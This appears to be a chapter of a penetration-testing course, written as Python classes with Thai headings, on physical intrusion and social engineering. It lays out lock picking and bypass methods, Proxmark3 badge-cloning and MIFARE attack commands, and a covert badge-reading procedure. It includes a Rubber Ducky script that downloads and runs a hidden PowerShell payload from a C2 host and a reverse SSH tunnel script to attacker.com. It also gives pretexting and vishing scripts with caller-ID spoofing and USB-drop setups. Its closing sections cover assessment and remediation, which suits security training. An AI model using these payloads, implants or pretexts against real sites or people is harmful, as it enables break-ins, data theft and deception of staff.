# Part 82: Physical Security & Social Engineering (Steps 811-820)

## Step 811: Physical Penetration Testing Overview

การทดสอบความปลอดภัยทางกายภาพ

```python
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class PhysicalPenTest:
    """Physical penetration testing methodology"""
    
    def scope_and_objectives(self) -> Dict:
        return {
            "common_objectives": [
                "Test physical access controls (doors, locks, badges)",
                "Test tailgating/piggybacking prevention",
                "Test security guard effectiveness",
                "Test CCTV blind spots",
                "Plant rogue devices (network tap, USB drop)",
                "Access server rooms, data centers",
                "Retrieve sensitive documents"
            ],
            "rules_of_engagement": [
                "Written authorization letter (get-out-of-jail-free card)",
                "Emergency contact numbers",
                "Clear scope boundaries (which buildings/floors)",
                "Time windows if restricted",
                "Photo documentation of findings"
            ]
        }
    
    def reconnaissance_physical(self) -> Dict:
        return {
            "external_recon": [
                "Google Maps/Street View for building layout",
                "Satellite images for parking, exits, CCTV positions",
                "LinkedIn for employee names, roles, office locations",
                "Job postings reveal security technologies used",
                "Badge/ID design research via social media photos"
            ],
            "on_site_recon": [
                "Foot surveillance - observe employee patterns",
                "Identify smoking areas (tailgate opportunity)",
                "Note delivery schedules",
                "Map CCTV positions",
                "Identify security guard patrol patterns",
                "Test door alarm response times"
            ]
        }
    
    def pretexting_scenarios(self) -> List[Dict]:
        return [
            {
                "scenario": "IT Contractor",
                "props": ["Polo shirt with IT vendor logo", "Laptop bag", "Tool kit"],
                "pretext": "Here to service the network equipment",
                "target": "Server room access"
            },
            {
                "scenario": "Fire Safety Inspector",
                "props": ["Hi-vis vest", "Clipboard", "Badge"],
                "pretext": "Annual fire safety inspection",
                "target": "All areas including secured zones"
            },
            {
                "scenario": "New Employee",
                "props": ["Smart casual clothing", "Laptop", "Coffee"],
                "pretext": "Started this week, forgot my badge",
                "target": "Tailgate through secure door"
            },
            {
                "scenario": "Delivery Person",
                "props": ["Delivery uniform", "Boxes", "Clipboard"],
                "pretext": "Package delivery for [real name from LinkedIn]",
                "target": "Bypass reception, access internal areas"
            }
        ]


if __name__ == '__main__':
    pentest = PhysicalPenTest()
    print("Physical pentest objectives:")
    for obj in pentest.scope_and_objectives()['common_objectives'][:5]:
        print(f"  - {obj}")
    
    print("\nPretexting scenarios:")
    for scenario in pentest.pretexting_scenarios():
        print(f"  [{scenario['scenario']}] Target: {scenario['target']}")
```

## Step 812: Lock Picking Fundamentals

หลักการ Lock Picking เพื่อผ่านการเข้าถึงพื้นที่

```python
from dataclasses import dataclass
from typing import Dict, List

@dataclass
class LockPicking:
    """Lock picking techniques for physical security testing"""
    
    def pin_tumbler_basics(self) -> Dict:
        return {
            "how_pin_locks_work": [
                "Key pins (bottom) + driver pins (top) in each chamber",
                "Spring pushes pins down, blocking rotation",
                "Correct key lifts each pin stack to exactly the shear line",
                "All pins at shear line = plug rotates = door opens"
            ],
            "picking_principle": [
                "Tension wrench applies slight rotational pressure to plug",
                "Manufacturing tolerances cause pins to bind one at a time",
                "Pick lifts binding pin to shear line - 'set' with a click",
                "Repeat for each pin until all set = lock opens"
            ],
            "tools": [
                "Tension wrench (top-of-keyway or bottom-of-keyway)",
                "Hook pick (single pin picking)",
                "Rake (raking technique - faster, less precise)",
                "Diamond pick",
                "City rake / Snake rake"
            ]
        }
    
    def picking_techniques(self) -> Dict:
        return {
            "single_pin_picking": {
                "description": "Pick each pin individually to shear line",
                "technique": [
                    "Insert tension wrench, apply light pressure",
                    "Insert hook pick to back of lock",
                    "Find binding pin (won't move freely)",
                    "Lift binding pin until click/give",
                    "Move to next binding pin",
                    "Repeat until all pins set and lock opens"
                ],
                "skill_level": "Intermediate - requires feel"
            },
            "raking": {
                "description": "Rake pick rapidly across pins",
                "technique": [
                    "Insert tension wrench",
                    "Insert rake pick",
                    "Rapidly in/out motion while applying tension",
                    "Randomizes pin positions hoping they fall into place"
                ],
                "speed": "Fast (seconds to minutes)",
                "skill_level": "Beginner - works on cheap locks"
            },
            "bump_key": {
                "description": "Modified key + impact technique",
                "method": "Cut all key cuts to depth 9, insert 1 tooth out, bump with mallet",
                "effect": "Impact causes pins to jump - rotation in that moment opens lock",
                "detection": "Leaves microscratches in keyway"
            },
            "impressioning": {
                "description": "Create working key without disassembly",
                "method": "Insert blank key, apply pressure+wiggle, file high spots visible in marks",
                "advantage": "Creates copy, leaves minimal evidence"
            }
        }
    
    def common_vulnerable_locks(self) -> List[Dict]:
        return [
            {"lock": "Cheap padlocks (Master #3)", "vulnerability": "Easy to rake or shim"},
            {"lock": "Tubular locks (vending machines)", "vulnerability": "Tubular lock pick"},
            {"lock": "Door lever handles", "vulnerability": "Loiding (credit card shimming)"},
            {"lock": "Deadbolts with exposed hinges", "vulnerability": "Hinge removal"},
            {"lock": "Electronic locks with backup keyway", "vulnerability": "Pick the backup"}
        ]


@dataclass
class BypassTechniques:
    """Physical access bypass without picking"""
    
    def non_destructive_bypass(self) -> Dict:
        return {
            "loiding": {
                "method": "Credit card / loid tool in door gap",
                "target": "Spring bolt latch (not deadbolt)",
                "tool": "Flexible shimming card pushed against latch"
            },
            "under_door_tool": {
                "method": "Hook under door to pull down lever handle",
                "target": "Doors with lever handles that open inward",
                "tool": "Wire hook + guide card"
            },
            "rfid_cloning": {
                "method": "Read badge wirelessly, clone to new card",
                "tool": "Proxmark3 or Flipper Zero",
                "range": "Covert reader in pocket: ~15cm, hand placement: 5cm",
                "target": "HID 125kHz prox cards (very common, not encrypted)"
            },
            "door_gap_attack": {
                "method": "Long reach tool through door gap to turn knob",
                "target": "Doors with internal knobs visible through gap"
            }
        }


if __name__ == '__main__':
    lp = LockPicking()
    print("Single pin picking steps:")
    for step in lp.picking_techniques()['single_pin_picking']['technique']:
        print(f"  {step}")
    
    print("\nVulnerable locks:")
    for lock in lp.common_vulnerable_locks():
        print(f"  {lock['lock']}: {lock['vulnerability']}")
    
    bypass = BypassTechniques()
    print("\nRFID cloning:")
    rfid = bypass.non_destructive_bypass()['rfid_cloning']
    print(f"  Tool: {rfid['tool']}")
    print(f"  Target: {rfid['target']}")
```

## Step 813: RFID/NFC Badge Cloning

การแคลอน access badge ด้วย Proxmark3 และ Flipper Zero

```python
from dataclasses import dataclass
from typing import Dict, List

@dataclass
class RFIDBadgeCloning:
    """RFID/NFC access card analysis and cloning"""
    
    def card_types(self) -> Dict:
        return {
            "125kHz_low_frequency": {
                "types": ["HID Prox", "EM4100", "Indala"],
                "security": "NONE - no encryption, just ID broadcast",
                "read_range": "~10cm normally, modified reader: 50cm+",
                "clone_difficulty": "TRIVIAL"
            },
            "13.56MHz_high_frequency": {
                "types": ["MIFARE Classic", "MIFARE Ultralight", "DESFire", "iCLASS"],
                "MIFARE_Classic": "Has crypto, but CRYPTO1 cipher is broken",
                "DESFire_EV1": "AES-128 encrypted, very hard to clone",
                "clone_difficulty": "MEDIUM (MIFARE Classic) to HARD (DESFire)"
            }
        }
    
    def proxmark3_commands(self) -> Dict:
        return {
            "identify_card": [
                "pm3> auto          # Autodetect card type",
                "pm3> lf search     # Search for LF (125kHz) tags",
                "pm3> hf search     # Search for HF (13.56MHz) tags"
            ],
            "read_hid_125khz": [
                "pm3> lf hid read   # Read HID Prox card",
                "pm3> lf em 410x read  # Read EM4100 card"
            ],
            "clone_to_t5577": [
                "# T5577 is a writable 125kHz clone card",
                "pm3> lf hid clone -r <raw_card_data>",
                "pm3> lf em 410x clone --id <em_id>"
            ],
            "mifare_classic_attack": [
                "pm3> hf mf chk --1k -f mfc_default_keys.dic  # Check default keys",
                "pm3> hf mf darkside  # Darkside attack",
                "pm3> hf mf nested --1k -f known_keys.dic   # Nested authentication",
                "pm3> hf mf dump 1   # Dump all sectors to file",
                "pm3> hf mf restore  # Restore to magic card"
            ]
        }
    
    def flipper_zero_usage(self) -> Dict:
        return {
            "read_125khz": "RFID -> Read 125 kHz -> Present card -> Save",
            "clone_125khz": "RFID -> Saved cards -> Select -> Write",
            "read_nfc": "NFC -> Read -> Present card -> Save",
            "emulate": "RFID/NFC -> Saved -> Emulate (hold button near reader)",
            "long_range_read": "Use ESP32 + Flipper with LF antenna mod for covert reading"
        }
    
    def covert_reader_setup(self) -> Dict:
        return {
            "concept": "Read badge from target without their knowledge",
            "tools": ["Modified Proxmark3 in backpack", "Long-range LF antenna"],
            "technique": [
                "Approach target with 125kHz reader in pocket/bag",
                "Get within 15-30cm of badge",
                "Proxmark3 auto-reads and saves data",
                "Clone to T5577 card later",
                "Use clone to access facility"
            ],
            "ethical_note": "Only in authorized engagements with explicit scope"
        }


if __name__ == '__main__':
    rfid = RFIDBadgeCloning()
    print("Card types:")
    for freq, info in rfid.card_types().items():
        print(f"  {freq}: Security={info['security'][:30] if len(info['security']) > 30 else info['security']}")
    
    print("\nFlipperZero usage:")
    for action, method in rfid.flipper_zero_usage().items():
        print(f"  {action}: {method}")
```

## Step 814: Rogue Device Implants

การฝังอุปกรณ์แฝง implant ใน network

```python
from dataclasses import dataclass
from typing import Dict, List

@dataclass
class RogueDevices:
    """Rogue hardware devices for physical access"""
    
    def lan_turtle(self) -> Dict:
        return {
                "device": "Hak5 LAN Turtle",
                "form_factor": "USB Ethernet adapter (looks legitimate)",
                "capabilities": [
                    "Persistent backdoor via reverse SSH tunnel",
                    "Network reconnaissance (nmap, tcpdump)",
                    "Man-in-the-middle attacks",
                    "DNS spoofing",
                    "Cron job for periodic check-in"
                ],
                "deployment": "Plug into available Ethernet port, blend with existing equipment"
        }
    
    def screen_crab(self) -> Dict:
        return {
            "device": "Hak5 Screen Crab",
            "form_factor": "HDMI passthrough (transparent)",
            "captures": "Screenshots of monitor output via HDMI",
            "storage": "MicroSD card",
            "exfil": "WiFi upload to C2 server"
        }
    
    def usb_rubber_ducky(self) -> Dict:
        return {
            "device": "USB Rubber Ducky / O.MG Cable",
            "appears_as": "USB Flash Drive or USB Cable",
            "function": "Programmable HID keyboard - types keystrokes",
            "payload_example": '''
# Ducky Script - opens PowerShell and downloads payload
DEFAULT_DELAY 200
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -exec bypass -c "IEX (iwr http://c2/payload -UseBasicParsing)"
ENTER
''',
            "advantage": "Bypasses AutoRun disabled - HID devices always trusted"
        }
    
    def raspberry_pi_implant(self) -> Dict:
        return {
            "hardware": "Raspberry Pi Zero W (small, cheap, WiFi)",
            "setup": [
                "Install Kali/Raspbian",
                "Configure reverse SSH tunnel on boot",
                "Configure WiFi client to target network",
                "Place in server room, ceiling tile, behind furniture"
            ],
            "crontab_persistence": "@reboot /home/pi/tunnel.sh",
            "tunnel_script": '''
#!/bin/bash
# Reverse SSH tunnel back to attacker
while true; do
    ssh -N -R 4444:localhost:22 \
        -i /home/pi/.ssh/id_rsa \
        -o StrictHostKeyChecking=no \
        -o ServerAliveInterval=60 \
        user@attacker.com
    sleep 30  # Retry if disconnected
done
''',
            "stealth": "Small form factor, can be hidden in ventilation or behind wall plates"
        }


if __name__ == '__main__':
    rogue = RogueDevices()
    print("LAN Turtle capabilities:")
    for cap in rogue.lan_turtle()['capabilities']:
        print(f"  - {cap}")
    
    print("\nRaspberry Pi implant setup:")
    for step in rogue.raspberry_pi_implant()['setup']:
        print(f"  {step}")
```

## Step 815: Social Engineering Attacks

เทคนิค Social Engineering ที่ใช้จิตวิทยาแทนเทคโนโลยี

```python
from dataclasses import dataclass
from typing import Dict, List

@dataclass
class SocialEngineering:
    """Social engineering attack frameworks"""
    
    def influence_principles(self) -> Dict:
        """Cialdini's principles of influence"""
        return {
            "reciprocity": "People return favors - bring donuts, get access",
            "commitment": "People follow through on stated commitments",
            "social_proof": "People follow what others do - 'your colleague let me in'",
            "authority": "People comply with authority figures - uniform, title",
            "liking": "People comply with people they like - build rapport",
            "scarcity": "Urgency/scarcity drives action - 'system down, need access NOW'"
        }
    
    def pretexting_framework(self) -> Dict:
        return {
            "preparation": [
                "Research target: org chart, names, projects, jargon",
                "Create believable backstory with verifiable details",
                "Prepare props and costume",
                "Practice the script",
                "Plan exit strategy if challenged"
            ],
            "execution": [
                "Establish baseline rapport quickly",
                "Use insider jargon to build credibility",
                "Name-drop real employees from LinkedIn",
                "Create urgency to bypass normal process",
                "Exploit desire to be helpful"
            ],
            "objection_handling": [
                "'I don't have access' -> 'Can you call [real manager name]?'",
                "'I need to see ID' -> Show prepared fake ID or real driving license",
                "'You need to fill out a form' -> 'Happy to, but boss is waiting on this NOW'"
            ]
        }
    
    def vishing_framework(self) -> Dict:
        """Voice phishing"""
        return {
            "technique": "Vishing (Voice Phishing)",
            "scenarios": [
                {
                    "name": "IT Support",
                    "call": "Hi, this is IT support calling about unusual activity on your account",
                    "ask": "Need to verify identity, then 'check' something with their credentials"
                },
                {
                    "name": "HR Survey",
                    "call": "Taking 5 min survey about office experience",
                    "harvest": "Org structure, security procedures, passwords indirectly"
                },
                {
                    "name": "Vendor Call",
                    "call": "Calling about your software license renewal",
                    "goal": "Get software versions, patch levels for vulnerability research"
                }
            ],
            "tools": ["SpoofCard (caller ID spoofing)", "SpoofTel", "Google Voice"]
        }
    
    def usb_drop_attack(self) -> Dict:
        return {
            "technique": "USB Drop Attack",
            "setup": [
                "Prepare USB drives with AutoRun/payload",
                "Label drives attractively: 'Payroll Q4 2024', 'Executive Bonuses'",
                "Drop in parking lot, bathrooms, kitchen near target office"
            ],
            "payload_types": [
                "AutoRun (disabled on modern Windows, still works on some)",
                "LNK file that executes payload when clicked",
                "Word/Excel document with macro",
                "Rubber Ducky-type HID attack"
            ],
            "success_rate": "Studies show 45-90% of dropped USBs get plugged in"
        }


if __name__ == '__main__':
    se = SocialEngineering()
    print("Influence principles:")
    for principle, desc in se.influence_principles().items():
        print(f"  {principle}: {desc}")
    
    print("\nVishing scenarios:")
    for scenario in se.vishing_framework()['scenarios']:
        print(f"  [{scenario['name']}] {scenario['call'][:50]}...")
```

## Step 816: Tailgating and Physical Bypass

เทคนิค tailgating และการผ่านประตูควบคุมการเข้าถึง

```python
from dataclasses import dataclass
from typing import Dict, List

@dataclass
class TailgatingTechniques:
    """Physical tailgating and bypass techniques"""
    
    def tailgating_methods(self) -> List[Dict]:
        return [
            {
                "method": "Classic Tailgating",
                "description": "Follow closely behind authorized person",
                "setup": "Hold boxes/coffee to appear hands-full (they'll hold door)",
                "success_factors": ["Act confident", "Blend with crowd", "Peak entry times"]
            },
            {
                "method": "Piggybacking (Consensual)",
                "description": "Convince authorized person to let you through",
                "pretext": "Badge not scanning, running late for meeting",
                "escalation": "Use name of real employee for authority"
            },
            {
                "method": "Door Propping",
                "description": "Prop secure door open with paperclip/shim",
                "target": "Fire exits, loading docks, smoking areas",
                "timing": "During shift change, lunch, fire drills"
            },
            {
                "method": "Emergency Exit Abuse",
                "description": "Push-bar exits open from inside",
                "method_detail": "Enter lobby, use stairwell emergency exit to access floors"
            }
        ]
    
    def mantrap_bypass(self) -> Dict:
        return {
            "what_is_mantrap": "Two-door airlock entry - second door won't open until first closes",
            "bypass_attempts": [
                "Tail a legitimate user (still works if no sensor)",
                "Social engineer guard to buzz through",
                "Claim sensor malfunction",
                "Multiple people entering simultaneously (volume attack)"
            ],
            "defense": "Weight sensors + camera with guard review before second door opens"
        }
    
    def physical_document_attacks(self) -> Dict:
        return {
            "dumpster_diving": {
                "what_to_find": ["Network diagrams", "System passwords", "Employee records",
                               "Org charts", "Internal process docs", "Old badges"],
                "legality": "Legal once in public trash (varies by jurisdiction)"
            },
            "shoulder_surfing": {
                "target": "Passwords, PIN codes, confidential emails",
                "tool": "High zoom camera from distance"
            },
            "badge_photograph": {
                "target": "Photograph employee badge to clone design",
                "use": "Print replica badge, add cloned RFID chip"
            }
        }


if __name__ == '__main__':
    tg = TailgatingTechniques()
    print("Tailgating methods:")
    for method in tg.tailgating_methods():
        print(f"  [{method['method']}] {method['description']}")
    
    print("\nDumpster diving targets:")
    for item in tg.physical_document_attacks()['dumpster_diving']['what_to_find']:
        print(f"  - {item}")
```

## Step 817-820: Physical Security Controls Assessment

การประเมินและสรุปผลการทดสอบความปลอดภัยทางกายภาพ

```python
from dataclasses import dataclass
from typing import Dict, List

@dataclass  
class PhysicalSecurityAssessment:
    """Comprehensive physical security assessment framework"""
    
    def access_control_checklist(self) -> Dict:
        return {
            "perimeter": [
                "Fencing and vehicle barriers",
                "Guard booth at entrances",
                "CCTV coverage of perimeter",
                "Lighting (no dark spots)",
                "Clear zone around building"
            ],
            "entry_points": [
                "Mantrap/airlock on critical entrances",
                "Anti-tailgating barriers (turnstiles)",
                "Badge + PIN (multi-factor physical)",
                "Security guard verification",
                "Visitor log and escorting policy"
            ],
            "internal_controls": [
                "Layered security zones (lobby -> office -> server room)",
                "Server room: biometric + badge",
                "Clean desk policy enforcement",
                "Locked printer output trays",
                "Screen privacy filters"
            ]
        }
    
    def findings_categories(self) -> List[Dict]:
        return [
            {"severity": "CRITICAL", "example": "Server room accessible without badge"},
            {"severity": "HIGH", "example": "Tailgating possible at main entrance"},
            {"severity": "HIGH", "example": "RFID badges using 125kHz (cloneable)"},
            {"severity": "MEDIUM", "example": "CCTV blind spots at loading dock"},
            {"severity": "MEDIUM", "example": "Sensitive documents in dumpster"},
            {"severity": "LOW", "example": "No clean desk policy enforcement"}
        ]
    
    def remediation_recommendations(self) -> Dict:
        return {
            "immediate": [
                "Upgrade 125kHz RFID to 13.56MHz DESFire EV2",
                "Install anti-tailgate barriers at secure entries",
                "Implement visitor escort policy and enforce it",
                "Add mantraps to server room entrance"
            ],
            "short_term": [
                "Security awareness training on tailgating",
                "Add biometric to server room access",
                "Fix CCTV blind spots",
                "Implement clean desk policy audits"
            ],
            "long_term": [
                "Regular physical penetration testing (annually)",
                "Access review - remove stale badges",
                "Integrate physical security with SIEM alerts",
                "Social engineering training and phishing simulations"
            ]
        }
    
    def physical_pentest_report_template(self) -> str:
        return """
## Physical Penetration Test Report

### Executive Summary
- Date of assessment: [DATE]
- Scope: [BUILDINGS/FLOORS]
- Overall risk: [CRITICAL/HIGH/MEDIUM/LOW]
- Objectives achieved: [LIST]

### Key Findings
1. [CRITICAL] Unauthorized server room access achieved via tailgating
   - Evidence: Photo of server room door held open
   - Risk: Full access to production servers
   - Recommendation: Install mantrap + anti-tailgate barriers

### Attack Scenarios Tested
| Scenario | Success | Notes |
|----------|---------|-------|
| Tailgate main entrance | YES | 3/3 attempts successful |
| Badge clone (125kHz) | YES | Cloned with Proxmark3 |
| Server room access | YES | Via tailgate |
| Document shredding check | PARTIAL | Some documents unshredded |

### Detailed Findings
[Full details, evidence, CVSSv3 scores]

### Remediation Roadmap
[Prioritized recommendations with timelines]
"""


if __name__ == '__main__':
    assessment = PhysicalSecurityAssessment()
    print("Entry point controls:")
    for control in assessment.access_control_checklist()['entry_points']:
        print(f"  - {control}")
    
    print("\nFindings by severity:")
    for finding in assessment.findings_categories():
        print(f"  [{finding['severity']}] {finding['example']}")
    
    print("\nImmediate remediation:")
    for rec in assessment.remediation_recommendations()['immediate']:
        print(f"  - {rec}")
```

---

## สรุป Part 82

| Step | หัวข้อ | เนื้อหาสำคัญ |
|------|--------|-------------|
| 811 | Physical PenTest | Objectives, recon, pretexting scenarios |
| 812 | Lock Picking | Pin tumbler basics, SPP, raking, bump key |
| 813 | RFID Cloning | Proxmark3 commands, Flipper Zero, HID 125kHz |
| 814 | Rogue Devices | LAN Turtle, Screen Crab, RPi implant |
| 815 | Social Engineering | Cialdini principles, vishing, USB drop |
| 816 | Tailgating | Methods, mantrap bypass, document attacks |
| 817-820 | Assessment | Access control checklist, findings, remediation |
